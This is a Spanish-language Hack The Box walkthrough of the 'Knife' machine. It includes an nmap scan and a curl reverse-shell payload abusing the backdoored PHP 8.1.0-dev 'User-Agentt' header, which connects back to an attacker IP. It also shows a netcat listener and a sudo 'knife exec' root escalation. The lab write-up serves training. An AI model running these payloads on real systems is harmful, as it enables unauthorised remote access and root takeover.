---
category: Hack The Box
tags:
  - HTB
  - eJPT
title: Machine Knife
comments: true
image: /assets/img/machines/knife/knifebanner.jpeg
---
# Introducción 

Knife es una máquina Linux de dificultad fácil que cuenta con una aplicación que se ejecuta en una versión de PHP con puerta trasera. Esta vulnerabilidad se aprovecha para obtener acceso al servidor. Una configuración incorrecta de sudo se explota posteriormente para obtener acceso a la consola de root.

### Skills

Abusing Sudoers Privilege (Knife Binary) (Privilege Escalation)
PHP 8.1.0-dev - 'User-Agent' Remote Code Execution (RCE)


# Enumeración

```bash
nmap -sCV -p22,80 10.10.10.242

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-27 16:56 -04
Nmap scan report for 10.10.10.242
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.77 seconds
```

### Puertos

- 22 ----> OpenSSH 8.2P1 Ubuntu 4Ubuntu0.2
- 80 ----> http Apache httpd 2.4.41 ((Ubuntu))


# PHP 8.1.0-dev user-agentt exploit

Este código ejecuta un ataque de **reversión de shell** a través de una solicitud HTTP con `curl`

```bash
curl -s -X GET http://10.10.10.242 -H "User-Agentt: zerodiumsystem ('bash -c \"bash -i >& /dev/tcp/10.10.16.6/443 0>&1\"');" | html2text
```

- `curl` es una herramienta para hacer solicitudes HTTP.

- `-s` (silent) evita que curl muestre mensajes de progreso.

- `-X GET` indica que se hará una solicitud HTTP **GET** a `http://10.10.16.6`.
  
- `-H` se usa para añadir un encabezado HTTP personalizado.


 A la vez ejecutar en otra terminal la escucha para ganar acceso.

```bash
nc -nlvp 443
```


```bash
james@knife:/$ cd
james@knife:~$ cat user.txt
```

## Alternativa


```bash
User-Agentt: zerodiumsystem("bash -c 'bash -i >& /dev/tcp/10.10.16.6/443 0>&1'");
```

![burpsuite](/assets/img/machines/knife/1.jpeg)


# Abusing Sudoers Privilege (Knife Binary) (Privilege Escalation)


Este comando intenta abrir una shell (`/bin/sh`) como `root` dentro del contexto de **Chef Knife**, lo que podría otorgar acceso de superusuario en sistemas donde Chef está instalado y configurado correctamente.

```bash
james@knife:~$ sudo -u root knife exec -E 'exec "/bin/sh"'
james@knife:~$ cd /rot/
james@knife:~$ cat root.txt
```

- **`sudo -u root`**

	- Ejecuta el siguiente comando como el usuario `root`.
    - Si el usuario que lo ejecuta tiene permisos de `sudo`, podrá elevar privilegios.


- **`knife exec -E 'exec "/bin/sh" '`**

    - `knife` es una herramienta de línea de comandos del framework de administración de configuración **Chef**.
    - `exec -E '...'` permite ejecutar código Ruby desde la línea de comandos.
    - `exec "/bin/sh"` dentro de Ruby reemplaza el proceso actual con una nueva shell (`sh`).
